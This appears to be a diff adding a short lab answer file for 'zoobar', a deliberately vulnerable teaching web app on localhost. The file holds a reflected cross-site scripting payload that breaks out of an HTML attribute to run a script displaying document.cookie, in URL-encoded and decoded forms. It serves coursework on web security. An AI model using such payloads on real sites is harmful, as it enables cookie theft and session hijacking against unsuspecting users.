@@ -1,0 +1,6 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%22%20size%3D10%3E%20%3Cscript%3E%20alert(document.cookie)%20%3C%2Fscript%20&random=696969
+
+
+'"" size=10> <script> alert(document.cookie) </script '
+Ignore the '', become ->
+%22%22%20size%3D10%3E%20%3Cscript%3E%20alert(document.cookie)%20%3C%2Fscript%20
